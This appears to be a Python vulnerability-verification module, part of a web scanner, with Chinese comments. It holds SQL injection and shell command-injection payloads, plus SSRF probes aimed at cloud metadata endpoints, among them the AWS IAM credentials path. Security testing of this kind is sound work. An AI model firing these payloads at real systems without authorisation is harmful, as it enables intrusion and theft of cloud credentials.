"""
Advanced Vulnerability Verification Module
高级漏洞验证模块 - 增强盲注检测能力

新增能力：
1. SQL注入布尔盲注检测
2. SQL注入时间盲注检测
3. RCE时间盲注检测（响应时间）
4. SSRF多云支持（AWS/Azure/GCP/阿里云）
"""

import asyncio
import re
import time
import logging
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass

logger = logging.getLogger(__name__)


@dataclass
class BlindInjectionResult:
    """盲注检测结果"""
    vulnerable: bool
    technique: str  # 'boolean_blind', 'time_blind', 'error_based'
    confidence: float  # 0.0 - 1.0
    evidence: str
    payload: str
    time_delta: Optional[float] = None


class AdvancedVulnVerifier:
    """
    高级漏洞验证器
    
    增强的盲注检测能力：
    1. SQL布尔盲注 - 通过响应差异判断
    2. SQL时间盲注 - 通过响应时间判断
    3. RCE时间盲注 - 通过时间延迟判断
    4. SSRF多云检测 - AWS/Azure/GCP/阿里云
    """

    SQL_BOOLEAN_PAYLOADS = [
        ("1' AND 1=1 --", "1' AND 1=2 --"),
        ("1' OR 1=1 --", "1' OR 1=2 --"),
        ("1\" AND 1=1 --", "1\" AND 1=2 --"),
        ("1' AND SLEEP(0) --", "1' AND SLEEP(2) --"),
    ]

    SQL_TIME_PAYLOADS = [
        "1' AND SLEEP(3) --",
        "1'; SELECT SLEEP(3)--",
        "1' WAITFOR DELAY '00:00:03' --",
        "1' OR SLEEP(3) --",
    ]

    RCE_TIME_PAYLOADS = [
        ("sleep 3", 3),
        ("ping -c 3 localhost", 3),
        (";sleep 3", 3),
        ("&& sleep 3", 3),
        ("|| sleep 3", 3),
        ("`sleep 3`", 3),
        ("$(sleep 3)", 3),
    ]

    SSRF_METADATA_ENDPOINTS = {
        'aws': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/api/token',
            'http://169.254.169.254/latest/user-data/',
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-01-01',
            'http://169.254.169.254/metadata/identity/info?api-version=2018-02-01',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
            'http://metadata.google.internal/computeMetadata/v1/instance/disks/',
        ],
        'aliyun': [
            'http://100.100.100.200/latest/meta-data/',
            'http://100.100.100.200/latest/api/token',
            'http://100.100.100.200/ecs/latest/meta-data/instance-id',
        ],
        'huawei': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/opaque/v1/meta-data/',
        ],
    }

    def __init__(self, http_client=None):
        self.http_client = http_client

    async def verify_sql_boolean_blind(
        self,
        url: str,
        params: Dict,
        method: str = 'POST'
    ) -> BlindInjectionResult:
        """
        SQL布尔盲注检测
        
        原理：构造永真和永假条件，根据响应差异判断是否存在注入
        """
        if not self.http_client:
            return BlindInjectionResult(
                vulnerable=False,
                technique='boolean_blind',
                confidence=0.0,
                evidence='No HTTP client available',
                payload=''
            )

        try:
            baseline_resp = await self.http_client.request(url, method, data=params)
            baseline_content = baseline_resp.content or ''
            baseline_status = baseline_resp.status_code

            true_payload, false_payload = self.SQL_BOOLEAN_PAYLOADS[0]

            for key in params.keys():
                test_params = params.copy()

                test_params_true = test_params.copy()
                test_params_true[key] = true_payload.replace("1", params[key][:1] if params[key] else '1')

                test_params_false = test_params.copy()
                test_params_false[key] = false_payload.replace("1", params[key][:1] if params[key] else '1')

                resp_true = await self.http_client.request(url, method, data=test_params_true)
                resp_false = await self.http_client.request(url, method, data=test_params_false)

                content_true = resp_true.content or ''
                content_false = resp_false.content or ''

                content_diff = len(content_true) != len(content_false)
                status_diff = resp_true.status_code != resp_false.status_code

                if content_diff or status_diff:
                    if abs(len(content_true) - len(content_false)) > 10:
                        return BlindInjectionResult(
                            vulnerable=True,
                            technique='boolean_blind',
                            confidence=0.9,
                            evidence=f'Content length difference: true={len(content_true)}, false={len(content_false)}',
                            payload=test_params_true[key]
                        )

                    return BlindInjectionResult(
                        vulnerable=True,
                        technique='boolean_blind',
                        confidence=0.7,
                        evidence=f'Status code difference: true={resp_true.status_code}, false={resp_false.status_code}',
                        payload=test_params_true[key]
                    )

            return BlindInjectionResult(
                vulnerable=False,
                technique='boolean_blind',
                confidence=0.3,
                evidence='No significant difference between true and false conditions',
                payload=''
            )

        except Exception as e:
            logger.debug(f"SQL boolean blind test failed: {e}")
            return BlindInjectionResult(
                vulnerable=False,
                technique='boolean_blind',
                confidence=0.0,
                evidence=f'Test error: {str(e)}',
                payload=''
            )

    async def verify_sql_time_blind(
        self,
        url: str,
        params: Dict,
        method: str = 'POST',
        timeout: int = 10
    ) -> BlindInjectionResult:
        """
        SQL时间盲注检测
        
        原理：注入SLEEP/WAITFOR等时间延迟函数，根据响应时间判断
        """
        if not self.http_client:
            return BlindInjectionResult(
                vulnerable=False,
                technique='time_blind',
                confidence=0.0,
                evidence='No HTTP client available',
                payload=''
            )

        try:
            baseline_start = time.time()
            baseline_resp = await self.http_client.request(url, method, data=params)
            baseline_time = time.time() - baseline_start

            for key in params.keys():
                for payload_template in self.SQL_TIME_PAYLOADS:
                    test_params = params.copy()
                    test_params[key] = payload_template

                    test_start = time.time()

                    try:
                        resp = await asyncio.wait_for(
                            self.http_client.request(url, method, data=test_params),
                            timeout=timeout
                        )
                        test_time = time.time() - test_start

                        if test_time > baseline_time + 2.5:
                            return BlindInjectionResult(
                                vulnerable=True,
                                technique='time_blind',
                                confidence=0.95,
                                evidence=f'Response delayed by {test_time - baseline_time:.2f}s (baseline: {baseline_time:.2f}s)',
                                payload=payload_template,
                                time_delta=test_time - baseline_time
                            )

                    except asyncio.TimeoutError:
                        return BlindInjectionResult(
                            vulnerable=True,
                            technique='time_blind',
                            confidence=0.95,
                            evidence=f'Request timed out after {timeout}s',
                            payload=payload_template,
                            time_delta=timeout
                        )

            return BlindInjectionResult(
                vulnerable=False,
                technique='time_blind',
                confidence=0.2,
                evidence=f'No time delay detected (baseline: {baseline_time:.2f}s)',
                payload=''
            )

        except Exception as e:
            logger.debug(f"SQL time blind test failed: {e}")
            return BlindInjectionResult(
                vulnerable=False,
                technique='time_blind',
                confidence=0.0,
                evidence=f'Test error: {str(e)}',
                payload=''
            )

    async def verify_rce_time_blind(
        self,
        url: str,
        params: Dict,
        method: str = 'POST',
        timeout: int = 15
    ) -> BlindInjectionResult:
        """
        RCE时间盲注检测
        
        原理：注入时间延迟命令，根据响应时间判断
        """
        if not self.http_client:
            return BlindInjectionResult(
                vulnerable=False,
                technique='time_blind',
                confidence=0.0,
                evidence='No HTTP client available',
                payload=''
            )

        try:
            baseline_start = time.time()
            baseline_resp = await self.http_client.request(url, method, data=params)
            baseline_time = time.time() - baseline_start

            for cmd, delay in self.RCE_TIME_PAYLOADS:
                for key in params.keys():
                    test_params = params.copy()

                    if '{cmd}' in str(test_params.get(key, '')):
                        test_params[key] = test_params[key].format(cmd=cmd)
                    else:
                        test_params[key] = f";{cmd}"

                    test_start = time.time()

                    try:
                        resp = await asyncio.wait_for(
                            self.http_client.request(url, method, data=test_params),
                            timeout=timeout
                        )
                        test_time = time.time() - test_start

                        if test_time > baseline_time + delay - 0.5:
                            return BlindInjectionResult(
                                vulnerable=True,
                                technique='time_blind_rce',
                                confidence=0.9,
                                evidence=f'Command executed, delay detected: {test_time:.2f}s (expected: ~{delay}s)',
                                payload=cmd,
                                time_delta=test_time
                            )

                    except asyncio.TimeoutError:
                        return BlindInjectionResult(
                            vulnerable=True,
                            technique='time_blind_rce',
                            confidence=0.95,
                            evidence=f'Request timed out after {timeout}s (command likely executed)',
                            payload=cmd,
                            time_delta=timeout
                        )

            return BlindInjectionResult(
                vulnerable=False,
                technique='time_blind_rce',
                confidence=0.3,
                evidence=f'No time delay detected',
                payload=''
            )

        except Exception as e:
            logger.debug(f"RCE time blind test failed: {e}")
            return BlindInjectionResult(
                vulnerable=False,
                technique='time_blind_rce',
                confidence=0.0,
                evidence=f'Test error: {str(e)}',
                payload=''
            )

    async def verify_ssrf_multi_cloud(
        self,
        url: str,
        params: Dict,
        method: str = 'POST'
    ) -> Dict[str, BlindInjectionResult]:
        """
        SSRF多云检测
        
        检测AWS/Azure/GCP/阿里云/华为云元数据端点
        """
        results = {}

        if not self.http_client:
            return results

        for cloud, endpoints in self.SSRF_METADATA_ENDPOINTS.items():
            for endpoint in endpoints:
                try:
                    test_params = params.copy()

                    if 'url' in params:
                        test_params['url'] = endpoint
                    elif 'path' in params:
                        test_params['path'] = endpoint
                    elif 'dest' in params:
                        test_params['dest'] = endpoint
                    else:
                        test_params[list(params.keys())[0]] = endpoint

                    resp = await self.http_client.request(url, method, data=test_params)
                    content = resp.content or ''

                    detected_indicators = []

                    if cloud == 'aws':
                        aws_indicators = ['instance-id', 'ami-id', 'security-credentials', 'iam']
                        detected_indicators = [i for i in aws_indicators if i.lower() in content.lower()]

                    elif cloud == 'azure':
                        azure_indicators = ['compute', 'subscriptionId', 'resourceGroupName', 'metadata']
                        detected_indicators = [i for i in azure_indicators if i.lower() in content.lower()]

                    elif cloud == 'gcp':
                        gcp_indicators = ['computeMetadata', 'instance-name', 'project-id']
                        detected_indicators = [i for i in gcp_indicators if i.lower() in content.lower()]

                    elif cloud == 'aliyun':
                        aliyun_indicators = ['instance-id', 'serial-number', 'owner-account-id']
                        detected_indicators = [i for i in aliyun_indicators if i.lower() in content.lower()]

                    elif cloud == 'huawei':
                        huawei_indicators = ['instance_uuid', 'limiter', 'meta-data']
                        detected_indicators = [i for i in huawei_indicators if i.lower() in content.lower()]

                    if detected_indicators or resp.status_code == 200:
                        if detected_indicators:
                            results[cloud] = BlindInjectionResult(
                                vulnerable=True,
                                technique='ssrf',
                                confidence=0.95,
                                evidence=f'Detected cloud metadata indicators: {detected_indicators}',
                                payload=endpoint
                            )
                        elif resp.status_code == 200 and len(content) > 0:
                            results[cloud] = BlindInjectionResult(
                                vulnerable=True,
                                technique='ssrf',
                                confidence=0.6,
                                evidence=f'Received response from {cloud} endpoint (status: {resp.status_code})',
                                payload=endpoint
                            )

                except Exception as e:
                    logger.debug(f"SSRF test failed for {cloud} {endpoint}: {e}")

        return results

    async def verify_ssrf_internal_network(
        self,
        url: str,
        params: Dict,
        method: str = 'POST',
        timeout: int = 5
    ) -> BlindInjectionResult:
        """
        SSRF内部网络检测
        
        检测是否能访问内部服务
        """
        if not self.http_client:
            return BlindInjectionResult(
                vulnerable=False,
                technique='ssrf_internal',
                confidence=0.0,
                evidence='No HTTP client available',
                payload=''
            )

        internal_targets = [
            ('127.0.0.1', 'localhost'),
            ('192.168.1.1', 'router'),
            ('10.0.0.1', 'internal'),
            ('172.16.0.1', 'docker'),
        ]

        try:
            for ip, desc in internal_targets:
                test_params = params.copy()

                if 'url' in params:
                    test_params['url'] = f'http://{ip}:8080/'
                elif 'path' in params:
                    test_params['path'] = f'http://{ip}/'
                else:
                    test_params[list(params.keys())[0]] = f'http://{ip}:8080/'

                try:
                    start_time = time.time()
                    resp = await asyncio.wait_for(
                        self.http_client.request(url, method, data=test_params),
                        timeout=timeout
                    )
                    response_time = time.time() - start_time

                    if resp.status_code != 400 and resp.status_code != 403:
                        return BlindInjectionResult(
                            vulnerable=True,
                            technique='ssrf_internal',
                            confidence=0.85,
                            evidence=f'Internal host accessible: {ip} ({desc}), status: {resp.status_code}',
                            payload=test_params[list(test_params.keys())[0]],
                            time_delta=response_time
                        )

                except asyncio.TimeoutError:
                    if desc == 'localhost':
                        return BlindInjectionResult(
                            vulnerable=True,
                            technique='ssrf_internal',
                            confidence=0.7,
                            evidence=f'Localhost SSRF possible (timeout may indicate filtering)',
                            payload=test_params[list(test_params.keys())[0]],
                            time_delta=timeout
                        )

        except Exception as e:
            logger.debug(f"SSRF internal network test failed: {e}")

        return BlindInjectionResult(
            vulnerable=False,
            technique='ssrf_internal',
            confidence=0.3,
            evidence='Internal network not accessible',
            payload=''
        )


async def test_sql_blind(url: str, params: Dict, http_client, method: str = 'POST') -> BlindInjectionResult:
    """便捷函数：测试SQL盲注"""
    verifier = AdvancedVulnVerifier(http_client)

    result = await verifier.verify_sql_boolean_blind(url, params, method)
    if result.vulnerable:
        return result

    result = await verifier.verify_sql_time_blind(url, params, method)
    return result


async def test_rce_blind(url: str, params: Dict, http_client, method: str = 'POST') -> BlindInjectionResult:
    """便捷函数：测试RCE盲注"""
    verifier = AdvancedVulnVerifier(http_client)
    return await verifier.verify_rce_time_blind(url, params, method)


async def test_ssrf_multi_cloud(url: str, params: Dict, http_client, method: str = 'POST') -> Dict[str, BlindInjectionResult]:
    """便捷函数：测试多云SSRF"""
    verifier = AdvancedVulnVerifier(http_client)
    return await verifier.verify_ssrf_multi_cloud(url, params, method)
